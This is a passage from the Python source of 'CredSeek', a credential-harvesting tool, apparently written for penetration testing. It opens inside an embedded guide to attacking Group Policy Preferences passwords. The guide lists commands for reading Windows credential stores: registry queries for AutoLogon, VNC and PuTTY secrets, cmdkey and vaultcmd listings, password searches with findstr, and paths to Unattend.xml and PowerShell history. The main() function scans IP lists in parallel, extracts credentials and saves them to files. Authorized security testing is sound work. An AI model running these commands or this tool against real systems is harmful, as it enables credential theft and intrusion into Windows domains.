4. Group Policy best practices:
   - Never store passwords in Group Policy
   - Use service accounts with minimal privileges
   - Rotate credentials regularly
   - Implement least privilege

VERIFICATION
------------
# Check for remaining GPP passwords
findstr /S /I cpassword \\\\domain.com\\SYSVOL\\*.xml

# Should return: "File not found" or no results

# PowerShell verification
Get-ChildItem -Path "\\\\$env:USERDNSDOMAIN\\SYSVOL" -Recurse -Include *.xml |
Select-String -Pattern "cpassword" -List |
Select-Object Path

================================================================================
                    9. ALTERNATIVE CRED DISCOVERY
================================================================================

If GPP passwords are cleaned up, look for:

REGISTRY CREDENTIALS
--------------------
# Windows AutoLogon credentials
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

# VNC passwords
reg query HKCU\\Software\\ORL\\WinVNC3\\Password
reg query HKLM\\SOFTWARE\\RealVNC\\WinVNC4

# PuTTY sessions
reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions

FILE-BASED CREDENTIALS
----------------------
# Unattend.xml files
C:\\Windows\\Panther\\Unattend.xml
C:\\Windows\\Panther\\Unattend\\Unattend.xml

# PowerShell history
Get-Content (Get-PSReadlineOption).HistorySavePath

# IIS web.config
C:\\inetpub\\wwwroot\\web.config

# Application config files
*.config containing "password="

NETWORK CREDENTIALS
-------------------
# Saved credentials
cmdkey /list

# Credential Manager
vaultcmd /listcreds:"Windows Credentials" /all

SCRIPT AND CONFIG FILES
-----------------------
# Search for passwords in files
findstr /si password *.txt *.xml *.config *.ini *.bat *.ps1

# .env files (web apps)
dir /s .env

# Git repositories (.git/config)
dir /s /a .git

================================================================================
                    10. RESOURCES
================================================================================

Official Documentation:
- MS14-025: https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025
- LAPS: https://www.microsoft.com/en-us/download/details.aspx?id=46899
- GPP Documentation: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn581922(v=ws.11)

Tools:
- gpp-decrypt: https://github.com/leonjza/gpp-decrypt
- PowerSploit Get-GPPPassword: https://github.com/PowerShellMafia/PowerSploit
- CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec
- Metasploit GPP modules: https://www.rapid7.com/db/modules/

Research Papers:
- "Group Policy Pwnage" - Chris Campbell
- "GPP Password Exploitation" - Rapid7

Community Resources:
- https://adsecurity.org/
- https://pentestlab.blog/
- https://attack.mitre.org/techniques/T1552/006/

================================================================================
                        FINAL NOTES
================================================================================

This guide is for authorized security testing only. Always:
- Obtain proper authorization before testing
- Follow ethical hacking guidelines
- Report findings professionally
- Help organizations remediate properly

Remember: GPP passwords are low-hanging fruit. Check for them on EVERY
Windows domain assessment. The exploitation is trivial, but the impact can
be critical.

================================================================================
                Generated by CredSeek v1.0
                github.com/Lokii-git/seeksweet
================================================================================
"""
    
    try:
        with open(filename, 'w') as f:
            f.write(guide_content)
        print(f"{GREEN}[+] GPP attack guide saved to: {filename}{RESET}")
        return filename
    except Exception as e:
        print(f"{RED}[!] Error saving GPP guide: {e}{RESET}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description='CredSeek - Credential Harvesting Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  ./credseek.py iplist.txt                      # Quick file discovery
  ./credseek.py iplist.txt --deep               # Deep scan (download & analyze)
  ./credseek.py --shares smblist.txt            # Scan known SMB hosts
  ./credseek.py --gpp dclist.txt                # GPP password extraction
  ./credseek.py iplist.txt --deep -w 20         # Fast deep scan (20 workers)
        """
    )
    
    parser.add_argument('input_file', nargs='?', help='File containing IP addresses (one per line)')
    parser.add_argument('--shares', help='File containing SMB host IPs')
    parser.add_argument('--gpp', help='File containing DC IPs (for GPP password extraction)')
    parser.add_argument('--deep', action='store_true', help='Deep scan: download and analyze files')
    parser.add_argument('-w', '--workers', type=int, default=5, help='Number of concurrent workers (default: 5)')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Connection timeout in seconds (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Determine input source
    ips = []
    if args.input_file:
        ips = read_ip_list(args.input_file)
    elif args.shares:
        ips = read_ip_list(args.shares)
    elif args.gpp:
        ips = read_ip_list(args.gpp)
    else:
        parser.print_help()
        sys.exit(1)
    
    if not ips:
        print(f"{RED}[!] No IPs to scan{RESET}")
        sys.exit(1)
    
    print(f"{CYAN}[*] Starting credential scan...{RESET}")
    print(f"{CYAN}[*] Targets: {len(ips)}{RESET}")
    print(f"{CYAN}[*] Workers: {args.workers}{RESET}")
    print(f"{CYAN}[*] Deep scan: {'Yes' if args.deep else 'No'}{RESET}")
    print()
    
    results = []
    
    try:
        with ThreadPoolExecutor(max_workers=args.workers) as executor:
            future_to_ip = {executor.submit(scan_host, ip, args): ip for ip in ips}
            
            for future in as_completed(future_to_ip):
                ip = future_to_ip[future]
                try:
                    result = future.result()
                    results.append(result)
                    
                    if result['status'] == 'findings':
                        severity = f"{RED}[HIGH]{RESET}"
                        msg = f"{severity} {ip}"
                        
                        if result['files_found']:
                            msg += f" - {len(result['files_found'])} credential files"
                        if result['credentials']:
                            msg += f" - {len(result['credentials'])} credentials extracted"
                        if result['gpp_passwords']:
                            msg += f" - GPP passwords found"
                        
                        print(msg)
                    elif args.verbose:
                        print(f"{BLUE}[*]{RESET} {ip} - No findings")
                        
                except KeyboardInterrupt:
                    print(f"\n{YELLOW}[!] Scan interrupted by user{RESET}")
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                except Exception as e:
                    if args.verbose:
                        print(f"{RED}[!]{RESET} {ip} - Error: {e}")
    
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Scan interrupted by user{RESET}")
    
    # Print summary
    print(f"\n{CYAN}{'=' * 80}{RESET}")
    print(f"{CYAN}Scan Complete{RESET}")
    print(f"{CYAN}{'=' * 80}{RESET}")
    
    hosts_with_findings = len([r for r in results if r['status'] == 'findings'])
    total_files = sum(len(r['files_found']) for r in results)
    total_creds = sum(len(r['credentials']) for r in results)
    total_gpp = sum(len(r['gpp_passwords']) for r in results)
    
    print(f"Hosts with findings: {hosts_with_findings}/{len(ips)}")
    print(f"Credential files found: {total_files}")
    print(f"Credentials extracted: {total_creds}")
    print(f"GPP passwords found: {total_gpp}")
    
    # Save results
    if results:
        save_credlist(results)
        if total_files > 0:
            save_found_files(results)
        if total_creds > 0 or total_gpp > 0:
            save_found_credentials(results)
        save_details(results)
        save_json(results)
        
        # Generate GPP guide if GPP passwords found or --gpp flag used
        if total_gpp > 0 or args.gpp:
            save_gpp_attack_guide()
    
    print(f"\n{GREEN}[+] Scan complete!{RESET}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user{RESET}")
        sys.exit(0)
